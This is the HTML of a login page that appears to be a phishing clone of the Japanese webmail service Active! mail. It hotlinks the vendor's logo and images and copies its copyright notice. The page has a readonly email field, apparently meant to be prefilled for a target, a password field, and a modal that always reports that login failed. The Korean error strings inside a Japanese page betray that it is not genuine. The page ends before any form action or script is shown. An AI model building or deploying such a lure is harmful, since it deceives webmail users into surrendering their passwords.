<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
    <title>Active mail</title>
    <style>
        * {
            padding: 0;
            margin: 0;
        }
        body {
            background-image: url(https://acmail6.secure.ne.jp/am_viz/common/img/standard/index_bg.gif);
            background-repeat: repeat-y;
        }
        img {
            width: 100%;
            height: auto;
        }
        .imghh {
            width: 11%;
        }
        header {
            padding: 2rem;
            border-bottom: 2px solid white;
        }
        .topblue {
            background: #5791d1;
            padding: 5px;
        }
        div.contanbox {
            margin: 10% auto 14% auto;
            width: 410px;
            border: 1px solid #999999;
            background: #f0f0f0;
        }
        form {
            padding: 4px;
            width: 95%;
            margin: auto;
        }
        .innercont {
            width: 96%;
            margin: auto;
        }
        .flex1 {
            display: flex;
            align-items: center;
            gap: .7rem;
            margin: 3px 0;
        }
        .flex1 input {
            width: 160px;
            padding: 2px 2px;
        }
        .flex1 label {
            width: 90px;
            font-size: 12px;
            color: #333333;
            font-weight: 800;
            text-align: end;
        }
        .smallk {
            width: 20%;
        }
        .copyright {
            margin: 0;
            padding: 0;
            color: #666666;
            font-size: 68%;
            vertical-align: bottom;
            white-space: nowrap;
            text-align: left;
            font-weight: 600;
        }
        .flexd {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .flexd button {
            padding: 2px 9px;
            background: transparent;
        }
        .divider {
            width: 100%;
            background-image: url(https://acmail6.secure.ne.jp/am_viz/common/img/standard/index_border.gif);
            background-repeat: no-repeat;
            height: 1rem;
        }
        .boxalert {
            position: fixed;
            top: 0px;
            left: 0px;
            background-color: rgba(175, 175, 175, 0.471);
            width: 100%;
            height: 100vh;
            z-index: 10;
            display: none;
        }
        .innerboxx {
            border-width: 1px;
            border-style: solid;
            border-color: #3973ad;
            background-color: white;
            padding: 2px;
            width: 386px;
            height: 180px;
            margin: auto;
            margin-top: 17rem;
        }
        .top {
            padding: 3px 0 0 10px;
            color: white;
            background-color: #3973ad;
            cursor: default;
            font-size: 12px;
            font-weight: bold;
            white-space: nowrap;
        }
        .innerboxx button {
            padding: 3px 8px;
            margin: auto;
            display: block;
            text-align: center;
            margin-top: 1rem;
        }
    </style>
</head>
<body>
    <main>
        <header>
            <div class="imghh">
                <img src="https://acmail6.secure.ne.jp/am_viz/common/img/standard/am_logo_index.gif" alt="">
            </div>
        </header>
        <div class="divider"></div>

        <div class="contanbox">
            <div class="topblue">
                <div class="smallk">
                    <img src="https://acmail6.secure.ne.jp/am_viz/common/img/standard/index_login.gif" alt="">
                </div>
            </div>
            
            <form id="login-form">
                <div class="innercont">
                    <div class="flex1">
                        <label for="">電子メールID :</label>
                        <input type="text" name="userid" id="ai" readonly required>
                    </div>
                    <div class="flex1">
                        <label for="">パスワード :</label>
                        <input type="password" name="userpwd" id="namep" required>
                    </div>
                    <div class="flex1">
                        <label for="">言語 :</label>
                        <select name="" tabindex="4">
                            <option value="auto" selected="">自動選択</option>
                            <option value="en">English</option>
                            <option value="ja">日本語</option>
                            <option value="ko">韓国語</option>
                            <option value="zh-cn">中国語</option>
                        </select>
                    </div>
                </div>
                <div class="error" id="msg" style="display: none; color:red;">
                    아이디나 비밀번호가 정확하지 않습니다。
                </div>
                <div class="error" id="error" style="display: none; color:red;">
                    아이디나 비밀번호가 정확하지 않습니다。
                </div>
                <div class="dd">
                    <p style="text-align: end;font-size: 11.7px;font-weight: 800;font-family: sans-serif;">
                        <input type="checkbox" name="" id="">
                        ユーザーID/パスワードを保存する
                    </p>
                    <div class="flexd">
                        <small class="copyright">アクティブ！ 郵便 <br>©1998 株式会社クオリティア 無断転載を禁じます。</small>
                        <button type="submit" id="submit-btn">ログイン</button>
                    </div>
                </div>
            </form>
        </div>
    </main>
    <div class="boxalert">
        <div class="innerboxx">
            <div class="top">エラー: ログインエラー</div>
            <span>ログインに失敗しました。 ユーザーIDまたはパスワードが無効です。</span><br><br><br><br>
            <button id="close">オーケー</button>
        </div>
    </div>
